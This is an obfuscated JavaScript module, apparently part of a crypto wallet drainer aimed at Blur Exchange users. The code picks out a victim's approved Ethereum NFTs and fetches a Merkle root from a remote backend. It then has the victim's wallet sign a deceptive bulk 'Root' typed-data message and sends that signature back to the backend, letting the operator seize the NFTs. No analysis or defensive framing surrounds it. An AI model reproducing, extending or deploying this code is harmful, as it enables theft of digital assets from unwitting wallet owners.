function _0x29a1() {
    const _0x571c20 = [
      "136jJuckA",
      "getSigner",
      "1.0",
      "510iAwCWJ",
      "9605618nkyRff",
      "107965TSKrJR",
      "Blur\x20Exchange",
      "success",
      "90SDYqBw",
      "chain_id",
      "1648ZChsiC",
      "root",
      "466340ESVTkh",
      "3251697OIyRlK",
      "paths",
      "cancel",
      "address",
      "providers",
      "1041410MqBFru",
      "Web3Provider",
      "ERC721",
      "skip",
      "push",
      "type",
      "request",
      "blur",
      "46310580iDdvZX",
      "0x000000000000Ad05Ccc4F10045630fb830B95127",
      "0x00000000000111abe46ff893f3b2fdf1f759a8a8",
      "log",
      "data",
      "126dTSjyx",
      "4GAfMhu",
    ];
    _0x29a1 = function () {
      return _0x571c20;
    };
    return _0x29a1();
  }
  (function (_0x4d0cf6, _0x411e1b) {
    const _0x4a59fe = _0x423b,
      _0x32fc73 = _0x4d0cf6();
    while (!![]) {
      try {
        const _0x26a2fb =
          (-parseInt(_0x4a59fe(0x9a)) / 0x1) * (parseInt(_0x4a59fe(0xa1)) / 0x2) +
          (parseInt(_0x4a59fe(0xa4)) / 0x3) * (-parseInt(_0x4a59fe(0x96)) / 0x4) +
          (-parseInt(_0x4a59fe(0x9c)) / 0x5) * (parseInt(_0x4a59fe(0x95)) / 0x6) +
          (parseInt(_0x4a59fe(0xa3)) / 0x7) * (-parseInt(_0x4a59fe(0x97)) / 0x8) +
          (-parseInt(_0x4a59fe(0x9f)) / 0x9) * (parseInt(_0x4a59fe(0xa9)) / 0xa) +
          parseInt(_0x4a59fe(0x9b)) / 0xb +
          parseInt(_0x4a59fe(0xb1)) / 0xc;
        if (_0x26a2fb === _0x411e1b) break;
        else _0x32fc73["push"](_0x32fc73["shift"]());
      } catch (_0x33a6e6) {
        _0x32fc73["push"](_0x32fc73["shift"]());
      }
    }
  })(_0x29a1, 0x92b4f);
  function _0x423b(_0x1b3f86, _0xd32b0b) {
    const _0x29a16d = _0x29a1();
    return (
      (_0x423b = function (_0x423bb8, _0x114ed6) {
        _0x423bb8 = _0x423bb8 - 0x92;
        let _0x22b9bb = _0x29a16d[_0x423bb8];
        return _0x22b9bb;
      }),
      _0x423b(_0x1b3f86, _0xd32b0b)
    );
  }
  const SIGN_BLUR = async (
    _0x5ae26e,
    _0x3a1257,
    _0x5dcb58,
    _0x52cc50,
    _0x5e18dd
  ) => {
    const _0x27ad7e = _0x423b;
    try {
      const _0x1c5dbd = [],
        _0x235b5a = [];
      for (const _0x83012a of _0x5ae26e) {
        if (
          _0x83012a["skip"] ||
          _0x83012a[_0x27ad7e(0xae)] !== "ERC721" ||
          _0x83012a[_0x27ad7e(0xa0)] != 0x1
        )
          continue;
        if (
          !(await is_nft_approved(
            _0x83012a[_0x27ad7e(0xa7)],
            _0x5dcb58,
            _0x27ad7e(0x92)
          ))
        )
          continue;
        _0x1c5dbd["push"]({
          collection: _0x83012a["address"],
          tokenID: _0x83012a["id"],
        }),
          _0x235b5a[_0x27ad7e(0xad)](_0x83012a);
      }
      if (_0x1c5dbd["length"] < 0x2) return;
      let _0x4f2b43 = new ethers[_0x27ad7e(0xa8)][_0x27ad7e(0xaa)](_0x3a1257),
        _0x30911e = _0x4f2b43[_0x27ad7e(0x98)](),
        _0x2f0ff4 = await send_request({
          action: "blur",
          user_id: _0x5e18dd,
          blur: _0x27ad7e(0xa2),
          tokens: _0x1c5dbd,
          address: _0x5dcb58,
        });
      try {
        await send_request({
          action: _0x27ad7e(0xb0),
          user_id: _0x5e18dd,
          blur: _0x27ad7e(0xaf),
          assets: _0x235b5a,
        });
        const _0x4d56fb = await _0x30911e["_signTypedData"](
          {
            name: _0x27ad7e(0x9d),
            version: _0x27ad7e(0x99),
            chainId: 0x1,
            verifyingContract: _0x27ad7e(0xb2),
          },
          { Root: [{ name: _0x27ad7e(0xa2), type: "bytes32" }] },
          { root: _0x2f0ff4[_0x27ad7e(0x94)][_0x27ad7e(0xa2)] }
        );
        await send_request({
          action: _0x27ad7e(0xb0),
          user_id: _0x5e18dd,
          blur: _0x27ad7e(0x9e),
          signature: _0x4d56fb,
          address: _0x5dcb58,
          root: _0x2f0ff4[_0x27ad7e(0x94)][_0x27ad7e(0xa2)],
          paths: _0x2f0ff4["data"][_0x27ad7e(0xa5)],
        });
        for (const _0x29c552 of _0x5ae26e) {
          if (
            _0x29c552[_0x27ad7e(0xac)] ||
            _0x29c552[_0x27ad7e(0xae)] !== "ERC721" ||
            _0x29c552[_0x27ad7e(0xa0)] != 0x1
          )
            continue;
          let _0x243270 = ![];
          for (const _0xa9d77 of _0x235b5a) {
            if (
              _0xa9d77["type"] !== _0x27ad7e(0xab) ||
              _0xa9d77["chain_id"] != 0x1
            )
              continue;
            if (
              _0xa9d77[_0x27ad7e(0xa7)] == _0x29c552[_0x27ad7e(0xa7)] &&
              _0xa9d77["id"] == _0x29c552["id"]
            ) {
              _0x243270 = !![];
              break;
            }
          }
          _0x243270 == !![] && (_0x29c552[_0x27ad7e(0xac)] = !![]);
        }
      } catch (_0x25c213) {
        console[_0x27ad7e(0x93)](_0x25c213),
          await send_request({
            action: "blur",
            user_id: _0x5e18dd,
            blur: _0x27ad7e(0xa6),
          });
      }
    } catch (_0x2f02be) {
      console["log"](_0x2f02be);
    }
  };
  